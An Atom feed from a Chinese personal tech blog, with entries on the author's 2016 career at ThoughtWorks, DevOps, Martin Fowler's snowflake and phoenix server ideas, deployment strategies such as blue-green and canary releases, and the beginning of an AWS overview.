<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Adu&#39;s blog</title>
  <subtitle>life is beautiful</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://adu.404nf.cn/"/>
  <updated>2017-01-16T10:49:28.000Z</updated>
  <id>http://adu.404nf.cn/</id>
  
  <author>
    <name>Luke Du</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2016大事记</title>
    <link href="http://adu.404nf.cn/2017/01/16/2016%E5%A4%A7%E4%BA%8B%E8%AE%B0/"/>
    <id>http://adu.404nf.cn/2017/01/16/2016大事记/</id>
    <published>2017-01-16T08:35:41.000Z</published>
    <updated>2017-01-16T10:49:28.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;2016-野蛮生长的一年&quot;&gt;&lt;a href=&quot;#2016-野蛮生长的一年&quot; class=&quot;headerlink&quot; title=&quot;2016 野蛮生长的一年&quot;&gt;&lt;/a&gt;2016 野蛮生长的一年&lt;/h1&gt;&lt;h2 id=&quot;15年的尾声&quot;&gt;&lt;a href=&quot;#15年的尾声&quot; class=&quot;headerlink&quot; title=&quot;15年的尾声&quot;&gt;&lt;/a&gt;15年的尾声&lt;/h2&gt;&lt;p&gt;15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;成为一枚程序员&quot;&gt;&lt;a href=&quot;#成为一枚程序员&quot; class=&quot;headerlink&quot; title=&quot;成为一枚程序员&quot;&gt;&lt;/a&gt;成为一枚程序员&lt;/h2&gt;&lt;p&gt;之前的工作只是在码代码，对于代码的意义，如何成为一个网站，以及网站如何发挥它的价值是一无所知的，好在coding的内容都比较有趣，一遍发掘着网络世界的神奇，一遍学习养家糊口的本事。&lt;br&gt;从一开始的爬虫，到社工库，到端口扫描，对网络世界的认识逐步提高；从一开始不知道自己在做什么，到后来两周做的网站卖了三十万，到后来觉得技术可以改变世界；我一天天成长着，&lt;br&gt;直到找工作开始，我才算是真正的成为一名程序员，时间大概是在三月份左右，我笨手笨脚的搭建了自己的博客，开始系统回顾大学所学的知识，总结涉足IT行业半年以来的经验，研读一些自己没有遇到过但是别人遇到了的问题，对技术的态度由”讨口饭吃”，穿变成一种兴趣，对曾经不削一顾的计算机，竟然开始心心相惜。&lt;/p&gt;
&lt;h2 id=&quot;跳槽&quot;&gt;&lt;a href=&quot;#跳槽&quot; class=&quot;headerlink&quot; title=&quot;跳槽&quot;&gt;&lt;/a&gt;跳槽&lt;/h2&gt;&lt;p&gt;时间大概是在四月份，我收到一封拉勾网的回复，”ThoughtWorks的HR对你的简历感兴趣“，当时已经拿到软通的offer，薪资不低，且有华为靠山；但比较顾虑软通工作环境不佳，会对个人发展不利；抱着试一试的想法在清明陪爷爷奶奶游玩九寨沟期间给HR发了一封自荐邮件，假期结束后当即收到了Cherry的邮件回复，欢呼雀跃之余感叹这是我理梦想最近的一次。&lt;br&gt;大概在年初的时候我就来过一次软件园，当时在天府五街的地铁站前，感叹这里的办公楼都好大气，因为在北京真的没见过什么正儿八经的写字楼，于是发誓将来一定要在这里上班，加上好友引荐，早就觉得ThoughtWorks是一家女神一样的公司，宽松的文化，舒适的办公环境，有很多技术大牛，入职居然还配mac电脑，哈哈，当时就这样被这家公司吸引着。后来大概花了两周时间一边上班一遍翻完了大学四年的教材，在网上看了很多python的博客，提交homework， homework过了，通知到公司面试，逻辑测试, pair, 有种不过如此的感觉，不过还是认真对待，最终拿到offer，已经是五月了。&lt;/p&gt;
&lt;h2 id=&quot;复合&quot;&gt;&lt;a href=&quot;#复合&quot; class=&quot;headerlink&quot; title=&quot;复合&quot;&gt;&lt;/a&gt;复合&lt;/h2&gt;&lt;p&gt;拿到TW的offer之后果断拒绝了软通，也不再想面其他公司了，安心租房，过了一段自由自在的日子。&lt;br&gt;入职TW前期压力是比较大的，比找工作时更大强度的学习任务，更high-level的认知模型，在TW的最初两个月一度认为自己原来对软件开发一无所知，在此期间很感谢我的buddy给我的指引，还有好玩的同事们的帮助，海外项目组很轻松，又有很多高智商的人一起工作，没有以前公司经常可见的那种眼神呆滞的人，这样的环境让我觉得很舒服，成长也很快，在做过几次session，准备一段时间AWS认证考试无果之后，终于roll off了&lt;/p&gt;
&lt;h2 id=&quot;出差北京&quot;&gt;&lt;a href=&quot;#出差北京&quot; class=&quot;headerlink&quot; title=&quot;出差北京&quot;&gt;&lt;/a&gt;出差北京&lt;/h2&gt;&lt;p&gt;大概是在11月份的时候，天很冷，而且我知道这个时候北京又雾霾，但是没有办法，我还是降临了北京，国内项目组比较辛苦，节奏比较快，度过了最初一个星期7*14小时的工作后慢慢适应了，几乎找到一些上一家公司的感觉，实践了一些反模式再回过头来看海外交付组的最佳实践，不觉暗暗点头，有道理。&lt;br&gt;国内交付的小伙伴们都很活跃，项目压力越大明显感到项目组氛围更好，在这里我学会了阿瓦隆，也了解到很多公司的八卦。&lt;br&gt;圣诞节项目上线之后，年底feedback，很快我又roll off 了。&lt;/p&gt;
&lt;h2 id=&quot;家人来成都&quot;&gt;&lt;a href=&quot;#家人来成都&quot; class=&quot;headerlink&quot; title=&quot;家人来成都&quot;&gt;&lt;/a&gt;家人来成都&lt;/h2&gt;&lt;p&gt;元旦，2017结束了。&lt;br&gt;很多人都在总结，计划着新的一年新的开始，虽然感觉和大学时候的计划有所不同，但计划还是要有的，flag还是要立，哈哈，新年伊始，不能亏脑袋，毕竟在我精力最旺盛的年龄，我又是一个如此爱用脑的人。&lt;/p&gt;
&lt;h1 id=&quot;2017盘算着制造几件大事&quot;&gt;&lt;a href=&quot;#2017盘算着制造几件大事&quot; class=&quot;headerlink&quot; title=&quot;2017盘算着制造几件大事&quot;&gt;&lt;/a&gt;2017盘算着制造几件大事&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;考取AWS专家级认证&lt;/li&gt;
&lt;li&gt;考取阿里云认证&lt;/li&gt;
&lt;li&gt;争取一次Lead的机会&lt;/li&gt;
&lt;li&gt;参加公司招聘&lt;/li&gt;
&lt;li&gt;比较深入的研究云，PaaS服务&lt;/li&gt;
&lt;li&gt;了解性地学习学习算法，人工智能，区块链&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;2016-野蛮生长的一年&quot;&gt;&lt;a href=&quot;#2016-野蛮生长的一年&quot; class=&quot;headerlink&quot; title=&quot;2016 野蛮生长的一年&quot;&gt;&lt;/a&gt;2016 野蛮生长的一年&lt;/h1&gt;&lt;h2 id=&quot;15年的尾声&quot;&gt;&lt;a href=&quot;#15年的尾声&quot; class=&quot;headerlink&quot; title=&quot;15年的尾声&quot;&gt;&lt;/a&gt;15年的尾声&lt;/h2&gt;&lt;p&gt;15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？&lt;br&gt;
    
    </summary>
    
    
      <category term="小结" scheme="http://adu.404nf.cn/tags/%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>如何一句话介绍DevOps是做什么的</title>
    <link href="http://adu.404nf.cn/2016/11/11/%E5%A6%82%E4%BD%95%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%8B%E7%BB%8DDevOps%E6%98%AF%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84/"/>
    <id>http://adu.404nf.cn/2016/11/11/如何一句话介绍DevOps是做什么的/</id>
    <published>2016-11-11T01:42:58.000Z</published>
    <updated>2016-11-11T01:43:29.000Z</updated>
    
    <content type="html">&lt;p&gt;DevOps是一个很广泛的概念，他是一个运动，一种文化，延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等，每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppet,chef,salt,可视化这一块可能会涉及到一些PaaS平台，比如AWS，Rancher等等，持续集成持续部署这一块主要就是一些CI 工具，Jenkins，GOCD，等等。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;DevOps是一个很广泛的概念，他是一个运动，一种文化，延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等，每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppe
    
    </summary>
    
    
      <category term="DevOps" scheme="http://adu.404nf.cn/tags/DevOps/"/>
    
  </entry>
  
  <entry>
    <title>[翻译]雪花服务器</title>
    <link href="http://adu.404nf.cn/2016/11/04/%E7%BF%BB%E8%AF%91-%E9%9B%AA%E8%8A%B1%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://adu.404nf.cn/2016/11/04/翻译-雪花服务器/</id>
    <published>2016-11-04T07:29:52.000Z</published>
    <updated>2016-11-04T07:33:55.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;雪花服务器&quot;&gt;&lt;a href=&quot;#雪花服务器&quot; class=&quot;headerlink&quot; title=&quot;雪花服务器&quot;&gt;&lt;/a&gt;雪花服务器&lt;/h1&gt;&lt;p&gt;原文链接: &lt;a href=&quot;http://martinfowler.com/bliki/SnowflakeServer.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://martinfowler.com/bliki/SnowflakeServer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;导致的结果就是“雪花服务器” ———— 对数据中心带来不好的影响&lt;/p&gt;
&lt;p&gt;雪花服务器的第一个问题就是很难被复制。如果你的服务器硬件有问题，这就意味着你很难启动另一个服务器来提供相同的服务。如果你需要一个集群，你不能保证你启动的所有instance都是同步的。你不能复制一个产品环境来测试。当你的产品环境挂了，你将无法在你的开发测试环境重现这个错误。&lt;/p&gt;
&lt;p&gt;给你的雪花服务器创建镜像或许是一个解决方案，但是镜像往往会打包很多你不需要的配置，更别说错误也会被一同打包。&lt;/p&gt;
&lt;p&gt;然而，雪花服务器真正的脆弱，是在你需要改变他们的时候。雪花服务器很快就会变得难以理解和难以更改。对服务器的细微更改可能会引起一连串的连锁反应。你不确定配置的那一部分是重要的，哪些是遗留的。它的脆弱导致长时间，压力巨大的调制和debug。你需要手动流程和文档来支持你需要的更改。这也是为什么我们通常会看到很多重要的软件会运行在一个非常老旧的操作系统里。&lt;/p&gt;
&lt;p&gt;避免雪花服务的一个好的方式是以某种自动化的方式掌握整个运维过程的配置。Puppet和chef都可以做到这点，你可以用修改配置文件的方式将修改应用到你所有的环境中。&lt;/p&gt;
&lt;p&gt;自动化配置管理的的好处不仅是你可以重新build一个新的server，更重要的是你可以很容易知道你对一台服务器进行了什么样的配置，从而可以很容易更改。更长远的看，既然配置文件是文本格式，你可以把它纳入版本管理，就实现了基础设施即代码的好处。&lt;/p&gt;
&lt;p&gt;应用部署需要遵循一个简单的准则：完全自动化，所有改变纳入版本管理。&lt;br&gt;通过避免雪花服务，可以带来的好处是你可以完全复制你的产品环境来进行测试，减少配置误差导致的缺陷。&lt;/p&gt;
&lt;p&gt;一个很好地方式确保你不会陷入雪花服务器的困境就是使用凤凰服务。对配置进行版本管理是持续交付的重要部分。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;雪花服务器&quot;&gt;&lt;a href=&quot;#雪花服务器&quot; class=&quot;headerlink&quot; title=&quot;雪花服务器&quot;&gt;&lt;/a&gt;雪花服务器&lt;/h1&gt;&lt;p&gt;原文链接: &lt;a href=&quot;http://martinfowler.com/bliki/SnowflakeServer.html&quot;&gt;http://martinfowler.com/bliki/SnowflakeServer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。&lt;br&gt;
    
    </summary>
    
    
      <category term="翻译" scheme="http://adu.404nf.cn/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>翻译-凤凰式服务</title>
    <link href="http://adu.404nf.cn/2016/11/02/%E7%BF%BB%E8%AF%91-%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
    <id>http://adu.404nf.cn/2016/11/02/翻译-凤凰式服务/</id>
    <published>2016-11-02T09:06:13.000Z</published>
    <updated>2017-01-16T08:37:03.000Z</updated>
    
    <content type="html">&lt;p&gt;原文链接： &lt;a href=&quot;http://martinfowler.com/bliki/PhoenixServer.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://martinfowler.com/bliki/PhoenixServer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这或许只是个幻想，但其中包含着金子一样的智慧，你完全可以尝试定期毁掉你的服务器，一个服务应该像凤凰，定期从灰烬里重生。&lt;/p&gt;
&lt;p&gt;凤凰式服务首要的好处是避免配置飘移（Configuration dirft）：对操作系统指定的更改不会被记录，配置飘逸是一个巨大的泥潭，你不会希望被陷进去的。&lt;/p&gt;
&lt;p&gt;一个解决配置漂移的方法就是用一个软件自动地同步服务器配置达到一个已知的统一标准。Puppet和Chef（还有Ansible和salt）两个工具都可以做到这点，不停的重复申请他们定义的资源（所以他们也可以用于实践凤凰式服务），但这些工具的局限性是他们只能控制他们定义的那一部分配置，在他们定义以外的配置漂移不会被修复。而凤凰是从无到有的，它可以覆盖所有的资源配置。&lt;/p&gt;
&lt;p&gt;但这并不是说重复应用配置是无用的，毕竟它更快，破坏性也更小。他对解决配置飘移仍是有用的。&lt;/p&gt;
&lt;p&gt;e.g.&lt;br&gt;知名网站Netflix有一个chaos monkey专门用来随机毁掉一些服务来确保他们服务的弹性（高可用性）。&lt;/p&gt;
&lt;p&gt;注： 配置飘移?Configuration Dirft大意：&lt;br&gt;在一个生产环境的服务器中，比如一个数据库集群，由于数据库密码变动导致主从数据库不一致，或者在使用脚本去更改服务器配置的过程中让同一个环境下的服务器发生了配置不一致的情况.&lt;br&gt;参考链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://kief.com/configuration-drift.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://kief.com/configuration-drift.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.continuitysoftware.com/blog/what-is-configuration-drift/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.continuitysoftware.com/blog/what-is-configuration-drift/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cdn2.hubspot.net/hub/166743/file-22343462-pdf/docs/cios-guide-to-avoid-configuration-drift.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://cdn2.hubspot.net/hub/166743/file-22343462-pdf/docs/cios-guide-to-avoid-configuration-drift.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;原文链接： &lt;a href=&quot;http://martinfowler.com/bliki/PhoenixServer.html&quot;&gt;http://martinfowler.com/bliki/PhoenixServer.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。&lt;br&gt;
    
    </summary>
    
      <category term="study" scheme="http://adu.404nf.cn/categories/study/"/>
    
    
      <category term="翻译" scheme="http://adu.404nf.cn/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>部署和发布策略的演进</title>
    <link href="http://adu.404nf.cn/2016/10/24/%E9%83%A8%E7%BD%B2%E5%92%8C%E5%8F%91%E5%B8%83%E7%AD%96%E7%95%A5%E7%9A%84%E6%BC%94%E8%BF%9B/"/>
    <id>http://adu.404nf.cn/2016/10/24/部署和发布策略的演进/</id>
    <published>2016-10-24T06:30:20.000Z</published>
    <updated>2016-10-26T11:02:43.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;持续交付的目的&quot;&gt;&lt;a href=&quot;#持续交付的目的&quot; class=&quot;headerlink&quot; title=&quot;持续交付的目的&quot;&gt;&lt;/a&gt;持续交付的目的&lt;/h1&gt;&lt;h2 id=&quot;以下问题有没有解决？&quot;&gt;&lt;a href=&quot;#以下问题有没有解决？&quot; class=&quot;headerlink&quot; title=&quot;以下问题有没有解决？&quot;&gt;&lt;/a&gt;以下问题有没有解决？&lt;/h2&gt;&lt;p&gt;“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？&lt;br&gt;用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；&lt;br&gt;如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；&lt;br&gt;运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;部署和发布的区别&quot;&gt;&lt;a href=&quot;#部署和发布的区别&quot; class=&quot;headerlink&quot; title=&quot;部署和发布的区别&quot;&gt;&lt;/a&gt;部署和发布的区别&lt;/h1&gt;&lt;p&gt;要弄清楚部署和发布的区别，首先要弄清楚几个名词之间的关系CI(Continues Intergation)持续集成，CD(Continues Delivery)持续交付，持续集成的目的是对代码的快速反馈，在分布式开发的团队中你的更改不会破坏已有代码功能，持续交付的scope要大一些，指的是对用户交付最终价值，传统的交付最终价值即为产生可发布的版本，有的公司在持续交付的基础之上甚至提出了持续部署（Continous Deployment），即自动化讲可发布版本放入到产品环境，其中就涉及到蓝绿部署，滚动部署等部署方式。在部署和发布解耦之后，在将产品部署到产品环境之后我们可能还有些功能是不想对用户可见的，在对用户可见的的这个过程我们称之为发布（Release）（如图）。DevOps运动则是在发布之后有引入运维和运营的角色，和用户反馈一起形成一个闭环。恩，差不多是这个样子的。    &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://puppet.com/sites/default/files/2016-09/puppet_continuous_diagram.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ThoughtWorks在15年的技术雷达上已经建议解耦部署和发布:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 零宕机发布（目标）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;```零宕机发布指的一种将用户从一个版本几乎瞬间转移到另一个版本上的方法，更重要的是，如果出了什么问题，他还要能在瞬间把用户从这个版本转回到原先的版本上。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;零宕机发布的关键在于将发布流程中不同的部分解耦，尽量使他们能独立发生。&lt;/p&gt;
&lt;h1 id=&quot;凤凰式部署&quot;&gt;&lt;a href=&quot;#凤凰式部署&quot; class=&quot;headerlink&quot; title=&quot;凤凰式部署&quot;&gt;&lt;/a&gt;凤凰式部署&lt;/h1&gt;&lt;p&gt;将产品环境和应用打包发布，在容器产生之前是将系统和应用制作镜像的方式进行发布，避免产品环境和非生产环境不一致导致发布失败，但是这种发布方式因为笨重而被容器取代。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;便于回滚&lt;/li&gt;
&lt;li&gt;提高计算资源的利用率：相对以操作系统为计算单元的管理方式，容器不仅更轻量而且极大提高了计算资源的利用率，且容器本身不占用计算资源。而且相对image的方式，管理成本，备份的cost也极大降低&lt;/li&gt;
&lt;li&gt;更快的部署时间：image的方式需要一天，snapshot需要十分钟，Container则可以把这个时间缩短到秒级&lt;/li&gt;
&lt;li&gt;解决了环境不一致的问题&lt;/li&gt;
&lt;li&gt;跨平台&lt;/li&gt;
&lt;li&gt;prodocut team over project team:每个team可以更方便的管理自己的platform资源，极大地降低了team之间的沟通成本。（相对application team和platfor team分离的情况）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;风险：安全，容器必须是以root权限泡在宿主机上，不同容器共享一个宿主机，如果一个容器被贡献则会威胁到所有在改宿主机上的服务。&lt;br&gt;解决方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;及时更新宿主机系统版本，避免内核漏洞&lt;/li&gt;
&lt;li&gt;扫描bese image, 避免Container本身系统漏洞&lt;/li&gt;
&lt;li&gt;base image可以加入主动防御（e.g.ossec）&lt;/li&gt;
&lt;li&gt;控制好容器操作权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;滚动发布-Rolling-Release&quot;&gt;&lt;a href=&quot;#滚动发布-Rolling-Release&quot; class=&quot;headerlink&quot; title=&quot;滚动发布(Rolling Release)&quot;&gt;&lt;/a&gt;滚动发布(Rolling Release)&lt;/h1&gt;&lt;p&gt;又称滚动更新(rolling update)&lt;br&gt;指的是在不切换负载均衡器或者DNS的前提下把负载均衡器下的机器一台台关掉，部署好之后再挂到负载均衡器下面，与蓝绿部署直观的差别是不需要切换负载均衡器或DNS，同时做到零宕机部署。（还要完善）&lt;/p&gt;
&lt;h1 id=&quot;蓝绿部署（BuleGreen-Deployment）&quot;&gt;&lt;a href=&quot;#蓝绿部署（BuleGreen-Deployment）&quot; class=&quot;headerlink&quot; title=&quot;蓝绿部署（BuleGreen Deployment）&quot;&gt;&lt;/a&gt;蓝绿部署（BuleGreen Deployment）&lt;/h1&gt;&lt;p&gt;在发布之前就把应用程序放在产品环境上部署好，如果“发布”能像重新配置一下路由器那样简单，让他直接指向生产环境，那就更好了 ————《持续交付》&lt;br&gt;蓝绿部署主要解决的是宕机发布的问题&lt;br&gt;它的主要原理是在保持旧版本环境（绿环境）正常运行的情况下，准备一套蓝环境，在产品环境里蓝环境通过充分冒烟测试后再将用户访问从绿环境切换到蓝环境，如果蓝环境在这个切换之后出现问题则立即切换回绿环境，如果没有问题则最后destroy掉绿环境，具体做法可以通过DNS或者ELB配合AutoScaling Group进行Infrastructure的切换，这种切换通常在一秒之内就可以搞定。application层的回话切换以及数据库链接切换的问题，可以使用中间件解决。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://martinfowler.com/bliki/images/blueGreenDeployment/blue_green_deployments.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;对于数据库，直接从绿环境切换到蓝环境是不可能的，因为如果数据库结构发生改变的话，数据迁移需要时间。解决这种情况最理想的方法是在一小段时间把数据库变成只读状态，完成迁移后再将用户切换到蓝环境，恢复读写。如果在切换过程中仍然有数据的写入，你可以采用添加中间件的方式保存读写数据，或者在在读写过程中持续将事物发向新旧两个数据库。&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&quot;灰度发布（金丝雀发布）&quot;&gt;&lt;a href=&quot;#灰度发布（金丝雀发布）&quot; class=&quot;headerlink&quot; title=&quot;灰度发布（金丝雀发布）&quot;&gt;&lt;/a&gt;灰度发布（金丝雀发布）&lt;/h1&gt;&lt;p&gt;在把应用程序发布给所有人之前，先试着把它发布给一小撮用户群，这种技术叫做金丝雀发布。&lt;br&gt;金丝雀发布要解决的问题主要是缩短反馈周期，以及弥补巨大产品环境下无法进行有效容量测试所可能导致的问题的一种手段。是一个能大大降低新版本发布风险的方法。&lt;br&gt;灰度发布是蓝绿部署的一个延伸，采用逐步切换的方式使新版本发布只影响到尽可能少的用户，从而为AB测试提供条件。灰度发布&lt;br&gt;灰度发布与金丝雀部署在操作上是等价的&lt;br&gt;金丝雀发有以下几个好处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非常容易回滚，这个其实是蓝绿部署就已经带来的好处，只要不把用户引向有问题的新版本，就可以有足够的时间用来分析错误日志，排查问题。&lt;/li&gt;
&lt;li&gt;可以将同一批用户引至不新旧版本以进行A/B测试，某些公司可以度量新特性的使用率，某些公司可以度量该版本带来的收益，你不必将大量用户引入A/B测试，只需要有代表性的样本就足够了。&lt;/li&gt;
&lt;li&gt;可以通过逐渐增加负载，记录并衡量应用程序响应时间，CPU使用率，I/O，内存使用率以及日志中是否有异常报告这种方式来检查应用程序是否满足容量需求，降低容量测试不理想带来的风险。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外，需要注意的是，在生产环境中保留尽可能少的版本也是非常重要的，最好限制在两个版本之内。&lt;/p&gt;
&lt;h1 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;紧急修复：一定不要破坏流程，不要直接对生产环境进行修改。&lt;/li&gt;
&lt;li&gt;持续部署：If it hurts, do it more often&lt;/li&gt;
&lt;li&gt;持续发布用户自行安装的软件？发布方式？&lt;/li&gt;
&lt;li&gt;执行部署的人应该参与部署过程的创建（Dev和Ops的紧密合作）&lt;/li&gt;
&lt;li&gt;记录部署活动（自动化更佳）&lt;/li&gt;
&lt;li&gt;不要删除旧文件，而是移动到别的位置。在Unix环境中，一个最佳实践是把每个版本部署到不同的文件夹中，创建一个符号链接文件指向最新版本，版本的部署和回滚就只是改一下符号链接这么简单。&lt;/li&gt;
&lt;li&gt;部署是整个团队的责任（DevOps）&lt;/li&gt;
&lt;li&gt;快速失败，部署脚本也应该纳入测试中，这些测试应该被作为部署的一部分来工作。&lt;/li&gt;
&lt;li&gt;数据库最好向前兼容&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;持续交付的目的&quot;&gt;&lt;a href=&quot;#持续交付的目的&quot; class=&quot;headerlink&quot; title=&quot;持续交付的目的&quot;&gt;&lt;/a&gt;持续交付的目的&lt;/h1&gt;&lt;h2 id=&quot;以下问题有没有解决？&quot;&gt;&lt;a href=&quot;#以下问题有没有解决？&quot; class=&quot;headerlink&quot; title=&quot;以下问题有没有解决？&quot;&gt;&lt;/a&gt;以下问题有没有解决？&lt;/h2&gt;&lt;p&gt;“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？&lt;br&gt;用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；&lt;br&gt;如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；&lt;br&gt;运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？&lt;/p&gt;
    
    </summary>
    
    
      <category term="CD" scheme="http://adu.404nf.cn/tags/CD/"/>
    
  </entry>
  
  <entry>
    <title>AWS服务全解</title>
    <link href="http://adu.404nf.cn/2016/10/14/AWS%E6%9C%8D%E5%8A%A1%E5%85%A8%E8%A7%A3/"/>
    <id>http://adu.404nf.cn/2016/10/14/AWS服务全解/</id>
    <published>2016-10-14T12:21:49.000Z</published>
    <updated>2016-11-03T01:10:25.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;计算资源-Compute&quot;&gt;&lt;a href=&quot;#计算资源-Compute&quot; class=&quot;headerlink&quot; title=&quot;计算资源(Compute)&quot;&gt;&lt;/a&gt;计算资源(Compute)&lt;/h1&gt;&lt;h2 id=&quot;EC2（Elastic-Cloud-Compute）&quot;&gt;&lt;a href=&quot;#EC2（Elastic-Cloud-Compute）&quot; class=&quot;headerlink&quot; title=&quot;EC2（Elastic Cloud Compute）&quot;&gt;&lt;/a&gt;EC2（Elastic Cloud Compute）&lt;/h2&gt;&lt;p&gt;提供可扩展计算资源，可以在此基础上创建操作系统，分为可根据需求选择容量，大小，计算能力。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
